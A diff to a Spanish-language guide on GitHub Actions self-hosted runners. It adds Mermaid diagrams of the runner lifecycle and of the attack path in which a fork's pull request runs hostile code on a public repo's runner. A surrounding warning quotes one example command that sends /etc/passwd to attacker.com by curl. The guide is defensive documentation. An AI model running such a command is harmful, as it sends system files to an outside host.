@@ -12,6 +12,19 @@ Una vez que el runner está registrado y en marcha, es fundamental comprender c�
 
 El runner puede encontrarse en tres estados visibles desde la UI de GitHub (Settings > Actions > Runners) y desde la API REST. El estado refleja la disponibilidad del runner para aceptar nuevos jobs.
 
+```mermaid
+stateDiagram-v2
+    [*] --> Offline : Runner registrado\nservicio no iniciado
+    Offline --> Idle : Servicio iniciado\nconexión establecida con GitHub
+    Idle --> Active : Job asignado
+    Active --> Idle : Job completado\n(runner persistente)
+    Active --> [*] : Job completado\n(runner ephemeral)
+    Idle --> Offline : Servicio detenido\no red cortada
+    Offline --> [*] : config.sh remove\no Force remove en UI
+```
+
+*Ciclo de vida de un self-hosted runner: los runners ephemeral terminan su vida al completar un job; los persistentes regresan a Idle.*
+
 | Estado | Descripción | Causa habitual |
 |--------|-------------|----------------|
 | **Idle** | En línea y esperando jobs | Estado normal cuando el servicio está activo |
@@ -121,6 +134,23 @@ El mayor riesgo de seguridad de los self-hosted runners es su uso con repositori
 > [ADVERTENCIA] La documentación oficial de GitHub recomienda explícitamente **no usar self-hosted runners con repositorios públicos**. Un atacante puede hacer fork de un repo público y enviar un PR con un workflow que ejecute `curl http://attacker.com/$(cat /etc/passwd)` en tu infraestructura interna.
 
 El vector de ataque es el siguiente: un atacante hace fork de un repositorio público, modifica un workflow en `.github/workflows/`, abre un Pull Request y GitHub Actions ejecuta ese workflow en el self-hosted runner de la organización víctima. El atacante obtiene acceso de shell a la máquina del runner, a los secrets inyectados en el job y potencialmente a la red interna.
+
+```mermaid
+flowchart TD
+    ATK([Atacante]) --> FORK[Fork del repo público]
+    FORK --> WF[Modifica workflow\ncon código malicioso]
+    WF --> PR[Abre Pull Request]
+    PR --> EXEC[GitHub Actions ejecuta\nel workflow en runner\nself-hosted de la víctima]:::danger
+    EXEC --> ACCESS[Acceso shell al runner\n+ secrets del job\n+ red interna]:::danger
+
+    classDef danger    fill:#cf222e,color:#fff,stroke:#a40e26
+    classDef warning   fill:#9a6700,color:#fff,stroke:#7d4e00
+    classDef neutral   fill:#e6edf3,color:#1f2328,stroke:#d0d7de
+
+    class ATK,FORK,WF,PR neutral
+```
+
+*Vector de ataque en repositorios públicos con self-hosted runners: el código de un fork no confiable se ejecuta directamente en la infraestructura corporativa.*
 
 | Tipo de repositorio | Riesgo con self-hosted runner | Recomendación |
 |--------------------|-------------------------------|---------------|
